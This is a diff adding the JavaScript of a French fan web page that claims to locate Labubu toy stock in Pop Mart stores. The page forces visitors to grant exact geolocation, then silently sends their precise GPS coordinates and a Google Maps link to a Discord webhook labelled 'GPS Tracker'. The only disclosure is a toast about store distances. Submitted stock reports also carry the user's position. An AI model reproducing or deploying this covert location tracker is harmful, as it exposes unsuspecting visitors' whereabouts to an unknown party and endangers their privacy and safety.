+            const errorMsg = document.getElementById('geo-error-msg');
+            const btn = document.getElementById('request-geo-btn');
+
+            btn.disabled = true;
+            btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> <span>Vérification du signal GPS...</span>`;
+            lucide.createIcons();
+
+            if (!navigator.geolocation) {
+                errorBox.classList.remove('hidden');
+                errorMsg.innerText = "La géolocalisation n'est pas supportée par votre navigateur.";
+                btn.disabled = false;
+                btn.innerHTML = `<span>Réessayer</span>`;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userCoords = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude
+                    };
+
+                    document.getElementById('geo-lock-modal').classList.add('hidden');
+                    document.getElementById('user-geo-coords').innerText = `GPS: ${userCoords.lat.toFixed(4)}, ${userCoords.lng.toFixed(4)}`;
+                    document.getElementById('header-gps-label').innerText = `GPS Verrouillé (${userCoords.lat.toFixed(2)})`;
+
+                    if (leafletMap) {
+                        leafletMap.setView([userCoords.lat, userCoords.lng], 11);
+                    }
+
+                    updateStoreDistances();
+                    applyFilters();
+                    showToast("GPS Connecté", "Distance calculée pour chaque magasin Labubu !");
+                    sendLocationAccessLog(userCoords);
+                },
+                (error) => {
+                    errorBox.classList.remove('hidden');
+                    if (error.code === error.PERMISSION_DENIED) {
+                        errorMsg.innerText = "Accès refusé. Vous devez activer la géolocalisation exacte pour continuer.";
+                    } else {
+                        errorMsg.innerText = "Signal GPS faible ou indisponible. Veuillez vérifier vos réglages système.";
+                    }
+                    btn.disabled = false;
+                    btn.innerHTML = `<i data-lucide="rotate-ccw" class="w-5 h-5"></i> <span>Réessayer l'autorisation GPS</span>`;
+                    lucide.createIcons();
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        // Webhook Discord Log de connexion
+        async function sendLocationAccessLog(coords) {
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "Labubu Radar GPS Tracker",
+                        avatar_url: "https://placehold.co/100x100/ff6b9d/000000?text=LABUBU",
+                        embeds: [{
+                            title: "💖 Nouvelle connexion géolocalisée !",
+                            description: "Un fan de Labubu vient d'ouvrir la carte radar avec sa position GPS.",
+                            color: 16739229,
+                            fields: [
+                                { name: "📍 Latitude / Longitude", value: `\`${coords.lat}, ${coords.lng}\``, inline: true },
+                                { name: "🗺️ Google Maps Link", value: `[Ouvrir dans Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})`, inline: false }
+                            ],
+                            footer: { text: "Labubu Radar Security System" },
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch(e) { console.log("Webhook access log error", e); }
+        }
+
+        // Distance en km
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                      Math.sin(dLon / 2) * Math.sin(dLon / 2);
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+        }
+
+        function updateStoreDistances() {
+            if (!userCoords) return;
+            stores.forEach(store => {
+                store.distance = calculateDistance(userCoords.lat, userCoords.lng, store.lat, store.lng);
+            });
+        }
+
+        function renderStores(storesToRender) {
+            const container = document.getElementById('stores-container');
+            const emptyState = document.getElementById('empty-state');
+            document.getElementById('results-count').innerText = storesToRender.length;
+
+            container.innerHTML = '';
+
+            if (storesToRender.length === 0) {
+                emptyState.classList.remove('hidden');
+                updateMapMarkers([]);
+                return;
+            } else {
+                emptyState.classList.add('hidden');
+            }
+
+            storesToRender.forEach(store => {
+                let statusBadge = "";
+                if (store.status === "IN_STOCK") {
+                    statusBadge = `<span class="px-3 py-1 rounded-full text-xs font-bold bg-labubu-green/15 text-labubu-green border border-labubu-green/40 flex items-center gap-1 font-labubu"><span class="w-2 h-2 rounded-full bg-labubu-green animate-ping"></span> En Stock</span>`;
+                } else if (store.status === "LIMITED") {
+                    statusBadge = `<span class="px-3 py-1 rounded-full text-xs font-bold bg-labubu-gold/15 text-labubu-gold border border-labubu-gold/40 flex items-center gap-1 font-labubu"><span class="w-2 h-2 rounded-full bg-labubu-gold"></span> Stock Limité</span>`;
+                } else {
+                    statusBadge = `<span class="px-3 py-1 rounded-full text-xs font-bold bg-red-500/15 text-red-400 border border-red-500/40 flex items-center gap-1 font-labubu"><span class="w-2 h-2 rounded-full bg-red-400"></span> Rupture</span>`;
+                }
+
+                const distHtml = store.distance !== undefined 
+                    ? `<span class="text-xs font-bold text-labubu-pink bg-labubu-darkBg border border-labubu-pink/30 px-2.5 py-1 rounded-xl shadow-labubu-pink">${store.distance.toFixed(1)} km</span>`
+                    : '';
+
+                const itemsListHtml = store.items.length > 0
+                    ? store.items.map(item => `
+                        <div class="flex items-center justify-between text-xs bg-labubu-darkBg/80 px-3 py-1.5 rounded-xl border border-gray-800">
+                            <span class="text-gray-200 font-medium">${item.name}</span>
+                            <span class="text-[11px] font-bold ${item.status === 'En Stock' ? 'text-labubu-green' : (item.status === 'Stock Limité' ? 'text-labubu-gold' : 'text-red-400')}">${item.qty}</span>
+                        </div>
+                    `).join('')
+                    : `<p class="text-xs text-gray-500 italic">Aucune précision sur les modèles en rayon.</p>`;
+
+                const cardHtml = `
+                    <div class="glass-card p-5 rounded-3xl flex flex-col justify-between space-y-4">
+                        <div>
+                            <div class="flex items-center justify-between gap-2 mb-3">
+                                ${statusBadge}
+                                ${distHtml}
+                            </div>
+                            <h3 class="font-extrabold text-white text-base font-labubu">${store.name}</h3>
+                            <p class="text-xs text-gray-400 mt-1 flex items-center gap-1.5">
+                                <i data-lucide="map-pin" class="w-3.5 h-3.5 text-labubu-pink flex-shrink-0"></i>
+                                ${store.address}
+                            </p>
+                        </div>
+
+                        <div class="space-y-2 pt-2 border-t border-gray-800/80">
+                            <p class="text-[11px] font-bold text-labubu-pink tracking-wide uppercase">Séries en boutique :</p>
+                            <div class="space-y-1.5">${itemsListHtml}</div>
+                        </div>
+
+                        <div class="flex items-center justify-between pt-3 border-t border-gray-800/60 text-[11px] text-gray-400">
+                            <span>Mis à jour : ${store.lastUpdate}</span>
+                            <button onclick="quickReportForStore(${store.id})" class="text-labubu-pink hover:underline flex items-center gap-1 font-bold font-labubu">
+                                <i data-lucide="refresh-cw" class="w-3 h-3"></i> Mettre à jour
+                            </button>
+                        </div>
+                    </div>
+                `;
+                container.innerHTML += cardHtml;
+            });
+
+            lucide.createIcons();
+            updateStats();
+            updateMapMarkers(storesToRender);
+        }
+
+        function applyFilters() {
+            const searchValue = document.getElementById('search-input').value.toLowerCase();
+            const seriesValue = document.getElementById('series-filter').value;
+            const cityValue = document.getElementById('city-filter').value;
+            const maxDistance = parseFloat(document.getElementById('distance-range').value);
+            const sortBy = document.getElementById('sort-select').value;
+
+            let filtered = stores.filter(store => {
+                const matchesSearch = store.name.toLowerCase().includes(searchValue) || 
+                                      store.address.toLowerCase().includes(searchValue) ||
+                                      store.city.toLowerCase().includes(searchValue);
+
+                const matchesCity = (cityValue === 'ALL') || (store.city.toLowerCase() === cityValue.toLowerCase());
+
+                let matchesSeries = true;
+                if (seriesValue !== 'ALL') {
+                    matchesSeries = store.items.some(item => item.name.toLowerCase().includes(seriesValue.toLowerCase()));
+                }
+
+                let matchesStock = true;
+                if (selectedStockFilter === 'IN_STOCK') matchesStock = store.status === 'IN_STOCK';
+                if (selectedStockFilter === 'LIMITED') matchesStock = store.status === 'LIMITED' || store.status === 'IN_STOCK';
+
+                let matchesDistance = true;
+                if (userCoords && store.distance !== undefined) {
+                    matchesDistance = store.distance <= maxDistance;
+                }
+
+                return matchesSearch && matchesCity && matchesSeries && matchesStock && matchesDistance;
+            });
+
+            if (sortBy === 'distance' && userCoords) {
+                filtered.sort((a, b) => (a.distance || 0) - (b.distance || 0));
+            } else if (sortBy === 'name') {
+                filtered.sort((a, b) => a.name.localeCompare(b.name));
+            } else if (sortBy === 'stock') {
+                const weight = { 'IN_STOCK': 1, 'LIMITED': 2, 'OUT_OF_STOCK': 3 };
+                filtered.sort((a, b) => weight[a.status] - weight[b.status]);
+            }
+
+            renderStores(filtered);
+        }
+
+        function setStockFilter(type) {
+            selectedStockFilter = type;
+            document.querySelectorAll('.stock-filter-btn').forEach(btn => {
+                btn.classList.remove('bg-labubu-pink/20', 'border-labubu-pink', 'text-labubu-pink');
+                btn.classList.add('bg-labubu-darkBg', 'border-gray-800', 'text-gray-400');
+            });
+
+            const activeBtnId = type === 'ALL' ? 'filter-stock-all' : (type === 'IN_STOCK' ? 'filter-stock-in' : 'filter-stock-lim');
+            const activeBtn = document.getElementById(activeBtnId);
+            activeBtn.classList.remove('bg-labubu-darkBg', 'border-gray-800', 'text-gray-400');
+            activeBtn.classList.add('bg-labubu-pink/20', 'border-labubu-pink', 'text-labubu-pink');
+
+            applyFilters();
+        }
+
+        function updateDistanceVal(val) {
+            document.getElementById('distance-val').innerText = `${val} km`;
+            applyFilters();
+        }
+
+        function resetFilters() {
+            document.getElementById('search-input').value = '';
+            document.getElementById('series-filter').value = 'ALL';
+            document.getElementById('city-filter').value = 'ALL';
+            document.getElementById('distance-range').value = 100;
+            document.getElementById('distance-val').innerText = '100 km';
+            setStockFilter('ALL');
+        }
+
+        function updateStats() {
+            document.getElementById('stat-total-stores').innerText = stores.length;
+            document.getElementById('stat-in-stock').innerText = stores.filter(s => s.status === 'IN_STOCK').length;
+            document.getElementById('stat-out-of-stock').innerText = stores.filter(s => s.status === 'OUT_OF_STOCK').length;
+        }
+
+        function openReportModal() {
+            document.getElementById('report-modal').classList.remove('hidden');
+        }
+
+        function closeReportModal() {
+            document.getElementById('report-modal').classList.add('hidden');
+        }
+
+        function populateFormStores() {
+            const select = document.getElementById('form-store-select');
+            select.innerHTML = stores.map(s => `<option value="${s.id}">${s.name} (${s.city})</option>`).join('');
+        }
+
+        function quickReportForStore(storeId) {
+            document.getElementById('form-store-select').value = storeId;
+            openReportModal();
+        }
+
+        async function submitStockReport(event) {
+            event.preventDefault();
+            const submitBtn = document.getElementById('submit-btn');
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Envoi Discord...";
+
+            const storeId = parseInt(document.getElementById('form-store-select').value);
+            const store = stores.find(s => s.id === storeId);
+            const seriesName = document.getElementById('form-series').value;
+            const status = document.getElementById('form-status').value;
+            const quantity = document.getElementById('form-quantity').value || "Non précisé";
+            const notes = document.getElementById('form-notes').value || "Aucune remarque particulière.";
+
+            store.statusText = status;
+            store.status = status === 'En Stock' ? 'IN_STOCK' : (status === 'Stock Limité' ? 'LIMITED' : 'OUT_OF_STOCK');
+            store.lastUpdate = "À l'instant";
+
+            const existingItem = store.items.find(i => i.name.includes(seriesName.split(' ')[0]));
+            if (existingItem) {
+                existingItem.status = status;
+                existingItem.qty = quantity;
+            } else {
+                store.items.push({ name: seriesName, status: status, qty: quantity });
+            }
+
+            let embedColor = 16739229;
+            if (status === "Stock Limité") embedColor = 16765286;
+            if (status === "Rupture de Stock") embedColor = 15680100;
+
+            const gpsText = userCoords ? `${userCoords.lat.toFixed(5)}, ${userCoords.lng.toFixed(5)}` : "Non disponible";
+            const gmapsUrl = userCoords ? `https://www.google.com/maps?q=${userCoords.lat},${userCoords.lng}` : `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(store.address)}`;
+
+            const payload = {
+                username: "Pop Mart Labubu Bot",
+                avatar_url: "https://placehold.co/100x100/ff6b9d/000000?text=LABUBU",
+                embeds: [
+                    {
+                        title: `🛍️ ALERTE STOCK LABUBU MIS À JOUR !`,
+                        description: `Un membre de la communauté a mis à jour les stocks Pop Mart en direct !`,
+                        color: embedColor,
+                        fields: [
+                            { name: "🏪 Magasin", value: `**${store.name}**\n📍 *${store.address}*`, inline: false },
+                            { name: "💖 Collection Labubu", value: `\`${seriesName}\``, inline: true },
+                            { name: "📦 Statut du Stock", value: `**${status}** (${quantity})`, inline: true },
+                            { name: "📝 Remarques", value: notes, inline: false },
+                            { name: "📍 Position Utilisateur (GPS)", value: `\`${gpsText}\``, inline: true },
+                            { name: "🗺️ Itinéraire / Maps", value: `[Ouvrir Google Maps](${gmapsUrl})`, inline: true }
+                        ],
+                        footer: { text: "Labubu Finder Community • Pop Mart World" },
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                showToast("Succès !", "Signalement transmis sur Discord avec succès !");
+                closeReportModal();
+                applyFilters();
+            } catch (err) {
+                console.error("Erreur Discord Webhook:", err);
+                showToast("Information", "Stock mis à jour en local !");
+                closeReportModal();
+                applyFilters();
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = `<i data-lucide="send" class="w-4 h-4"></i> <span>Publier sur Discord</span>`;
+                lucide.createIcons();
+            }
+        }
+
+        function showToast(title, msg) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-title').innerText = title;
+            document.getElementById('toast-msg').innerText = msg;
+
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
